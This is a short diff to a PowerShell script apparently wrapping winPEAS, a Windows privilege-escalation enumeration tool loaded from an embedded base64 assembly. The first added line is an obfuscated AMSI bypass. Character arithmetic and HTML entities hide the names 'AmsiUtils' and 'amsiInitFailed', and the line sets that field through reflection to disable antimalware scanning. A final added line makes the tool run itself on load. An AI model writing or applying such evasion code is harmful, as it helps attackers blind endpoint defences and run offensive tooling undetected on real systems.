@@ -1,3 +1,4 @@
+[Ref].Assembly.GetType('System.Management.Automation.'+$([CHAR]([BYtE]0x41)+[chAr](22+87)+[chAr](136-21)+[char](14+91))+'Utils').GetField($([SYsteM.nET.WEbUtiLitY]::HTmlDECoDe('&#97;&#109;&#115;&#105;&#73;&#110;&#105;&#116;&#70;&#97;&#105;&#108;&#101;&#100;')),'NonPublic,Static').SetValue($null,$true);
 function Invoke-winPEAS
 {
 
@@ -20,3 +21,4 @@ $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64bin
     $Results
 
 }
+Invoke-winPEAS
